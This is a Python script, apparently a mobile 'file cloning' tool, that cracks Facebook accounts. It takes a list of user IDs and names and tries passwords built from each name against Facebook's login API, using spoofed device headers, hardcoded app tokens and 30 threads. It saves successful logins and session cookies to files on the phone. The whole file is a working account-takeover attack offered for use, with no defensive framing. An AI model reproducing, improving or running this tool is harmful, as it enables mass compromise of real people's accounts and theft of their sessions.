import os,jsonimport os,time,zlibtry:	import re,base64,uuid,string,requests,random,sys,subprocess,platform	from string import *	from concurrent.futures import ThreadPoolExecutor as tredexcept ModuleNotFoundError:	print(' \n\n Module Not installed Correctly! ')	exit()oks,cps,loop,apk=[],[],0,[]try:	open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)except requests.exceptions.ConnectionError:	exit(' Network Is Too Slow ')def prox():    proxies = open('.prox.txt','r').read().splitlines()    return {'http': 'socks5://'+random.choice(proxies)}fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']sim_id = ''android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')fblc = 'en_US'try:        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')except:        fbcr = 'Roshan'fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')fbdv = modelfbsv = android_versionfbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')try:        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')        total = 0        for i in fbcr:                total+=1        select = ('1','2')        if select == '1':                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')                sim_id+=fbcr        elif select == '2':                try:                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')                        sim_id+=fbcr                except Exception as e:                        fbcr = "Roshan"                        sim_id+=fbcr        else:                fbcr = 'Roahan'                sim_id+=fbcrexcept:        fbcr = "Roahan"device = {        'android_version':android_version,        'model':model,        'build':build,        'fblc':fblc,        'fbmf':fbmf,        'fbbd':fbbd,        'fbdv':model,        'fbsv':fbsv,        'fbca':fbca,        'fbdm':fbdm}logo =(f"""                                                                           \x1b[1;33  ########  ########   #######        \x1b[1;91m ##     ## ##     ## ##     ##       \x1b[1;91m ##     ## ##     ## ##     ##        \x1b[1;95m########  ########  ##     ##        \x1b[1;91m##        ##   ##   ##     ##        \x1b[1;97m##        ##    ##  ##     ##        ##        ##     ##  #######\33[1;37m----------------------------------------------   Owner      :  KHALFAN-XD\x1b[1;92m   Version    :  1.1\033[1;37m--------------------------------------------------""")def linex():	print('\033[1;97m--------------------------------------------------')def clear():	os.system('clear')	print(logo)A = '\x1b[1;97m'B = '\x1b[1;96m'C = '\x1b[1;91m'D = '\x1b[1;92m'M = '\033[1;31m'H = '\033[1;32m'N = '\x1b[1;37m'E = '\x1b[1;93m'F = '\x1b[1;94m'G = '\x1b[1;95m'P = '\033[1;37m'loop=0oks=[]cps=[]pcp=[]id=[]tokenku=[]def menu():			clear()			print('\033[1;97m [1] File cloning\n [0] Exit menu')			linex()			xd=input(' \033[1;97mChoice : ')			if xd in ['1','01']:				clear()				print('\033[ mPut file example:  /sdcard/File.txt  etc..')				linex()				file = input(' \033[1;97mPut file path\033[1;37m: ')				try:					fo = open(file,'r').read().splitlines()				except FileNotFoundError:					print(' File location not found ')					time.sleep(1)					menu()				clear()				print('\033[1;37mTry Method (1) (\033[1;32mfor new\033[1;37m) \033[1;37m Try Method (2) (\033[1;32mfor Old\033[1;37m) ')				linex()				print('[1] Method \33[1;32m {1}\33[1;37m ')				print('[2] Method \33[1;32m {2}\33[1;37m ')				linex()				mthd=input('\033[1;33mChoice : ')				linex()				plist = []				try:					ps_limit = int(input(' \033[1;33mHow many passwords do you want to add ? '))				except:					ps_limit =1				clear()				print('\033[1;37m Exp: first last,firstlast,first123')				linex()				for i in range(ps_limit):					plist.append(input(f' \033[1;97mPut password {i+1}: '))				clear()				print(' \033[1;97mDo you went show cp account? (y/n): ')				linex()				cx=input('\033[1;97m Choice : ')				if cx in ['y','Y','yes','Yes','1']:					pcp.append('y')				else:					pcp.append('n')				with tred(max_workers=30) as crack_submit:					clear()					total_ids = str(len(fo))					print('\033[1;37m Total Accounts To Crack : \033[1;32m'+total_ids+f'\033[1;37m ')					print(' Cracking has been Started')					print(" To Stop Process CTRL+c")					linex()					for user in fo:						ids,names = user.split('|')						passlist = plist						if mthd in ['1','01']:							crack_submit.submit(api2,ids,names,passlist)						elif mthd in ['2','02']:							crack_submit.submit(api3,ids,names,passlist)				print('\033[1;37m')				linex()				print(' The process has completed')				print(' Total OK:: '+str(len(oks))+'/'+str(len(cps)))				linex()				input(' Press enter to back ')				os.system('python SXB.py')					def api2(ids,names,passlist):        try:                global ok,loop,sim_id                sys.stdout.write('\r\r\033[1;33m[PRO-M1] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                fn = names.split(' ')[0]                try:                        ln = names.split(' ')[1]                except:                        ln = fn                for pw in passlist:                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'                        fbbv = str(random.randint(111111111,999999999))                        android_version = device['android_version']                        model = device['model']                        build = device['build']                        fblc = device['fblc']                        fbcr = sim_id                        fbmf = device['fbmf']                        fbbd = device['fbbd']                        fbdv = device['fbdv']                        fbsv = device['fbsv']                        fbca = device['fbca']                        fbdm = device['fbdm']                        fbfw = '1'                        fbrv = '0'                        fban = 'FB4A'                        fbpn = 'com.facebook.katana'                        en = random.choice(['en_US','en_GB'])                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7S;FBSV/9;FBOP/1;FBCA/arm64-v8a;]"                        random_seed = random.Random()                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))                        device_id = str(uuid.uuid4())                        secure = str(uuid.uuid4())                        family = str(uuid.uuid4())                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        xd =str(''.join(random_seed.choices(string.digits, k=20)))                        sim_serials = f'["{xd}"]'                        li = ['28','29','210']                        li2 = random.choice(li)                        j1 = ''.join(random.choice(digits) for _ in range(2))                        jazoest = li2+j1                        data = {                                "adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}                        headers={                                'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '25227','X-FB-SIM-HNI': '29752','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '706'}                        url = 'https://b-graph.facebook.com/auth/login'                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'                        po = requests.post(url,data=data,headers=headers).json()                        if 'session_key' in po:                                        print('\r\r\033[1;32m[successful-PRO] '+ids+'|'+pas+'\033[1;97m')                                        q = po                                        powerSXB = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SXBramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SXBramxan};{powerSXB}"                                        ##print("\r\r\033[1;33m Cookie: "+coki)                                        open('/sdcard/SXB-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')                                        open('/sdcard/SXB-OK.txt','a').write(ids+'|'+pas+'\n')                                        oks.append(ids)                                        break                        elif twf in str(po):                                        if 'y' in pcp:                                                print('\r\r \033[1;34m[TWO-Factor-PRO] '+ids+'|'+pas)                                                twf.append(ids)                                                break                        elif 'www.facebook.com' in po['error']['message']:                                                 if 'y' in pcp:                                        	                                                print('\r\r\x1b[1;31m\r\r[CheckPoint-PRO] '+ids+' | '+pas+'\033[1;97m')                                                open('/sdcard/SXB-CP.txt','a').write(ids+'|'+pas+'\n')                                                break                                                cps.append(ids)                                        else:                                                open('/sdcard/SXB-CP.txt','a').write(ids+'|'+pas+'\n')                                                break                                                cps.append(ids)                        else:                                        continue                loop+=1        except requests.exceptions.ConnectionError:                time.sleep(5)                api2(ids,names,passlist)        except Exception as e:                pass                 #hmxamedef api3(ids,names,passlist):        try:                global ok,loop,sim_id                sys.stdout.write('\r\r\033[1;37m [PRO-M2] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                fn = names.split(' ')[0]                try:                        ln = names.split(' ')[1]                except:                        ln = fn                for pw in passlist:                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'                        fbbv = str(random.randint(111111111,999999999))                        android_version = device['android_version']                        model = device['model']                        build = device['build']                        fblc = device['fblc']                        fbcr = sim_id                        fbmf = device['fbmf']                        fbbd = device['fbbd']                        fbdv = device['fbdv']                        fbsv = device['fbsv']                        fbca = device['fbca']                        fbdm = device['fbdm']                        fbfw = '1'                        fbrv = '0'                        fban = 'FB4A'                        fbpn = 'com.facebook.katana'                        en = random.choice(['en_US','en_GB'])                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/218418231;FBCR/T-Mobile;FBMF/BullittGroupLimited;FBBD/Cat;FBPN/com.facebook.katana;FBDV/S41;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"                        random_seed = random.Random()                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))                        device_id = str(uuid.uuid4())                        secure = str(uuid.uuid4())                        family = str(uuid.uuid4())                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        xd =str(''.join(random_seed.choices(string.digits, k=20)))                        sim_serials = f'["{xd}"]'                        li = ['28','29','210']                        li2 = random.choice(li)                        j1 = ''.join(random.choice(digits) for _ in range(2))                        jazoest = li2+j1                        data = {'adid': adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}                        headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': ua,'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}                        url = 'https://b-graph.facebook.com/auth/login'                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'                        po = requests.post(url,data=data,headers=headers).json()                        if 'session_key' in po:                                        print('\r\r\033[1;32m [successful-PRO] '+ids+' | '+pas+'\033[1;97m')                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")                                        coki = f"sb={compile_coki};{get_coki}"                                        #print("\r\r\033[1;33m Cookie: "+coki)                                        open('/sdcard/SXB-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')                                        open('/sdcard/SXB-OK.txt','a').write(ids+'|'+pas+'\n')                                        oks.append(ids)                                        break                        elif twf in str(po):                                        if 'y' in pcp:                                                print('\r\r \033[1;34m[TWO-Factor-PRO] '+ids+' | '+pas)                                                twf.append(ids)                                                break                        elif 'www.facebook.com' in po['error']['message']:                                        if 'y' in pcp:                                                print('\r\r\x1b[1;31m\r\r [CheckPoint-PRO] '+ids+' | '+pas+'\033[1;97m')                                                open('/sdcard/SXB-CP.txt','a').write(ids+'|'+pas+'\n')                                                break                                                cps.append(ids)                                        else:                                                open('/sdcard/SXB-CP.txt','a').write(ids+'|'+pas+'\n')                                                break                                                cps.append(ids)                        else:                                        continue                loop+=1        except requests.exceptions.ConnectionError:                time.sleep(5)                api3(ids,names,passlist)        except Exception as e:                pass                try:    menu()except Exception as e:exit()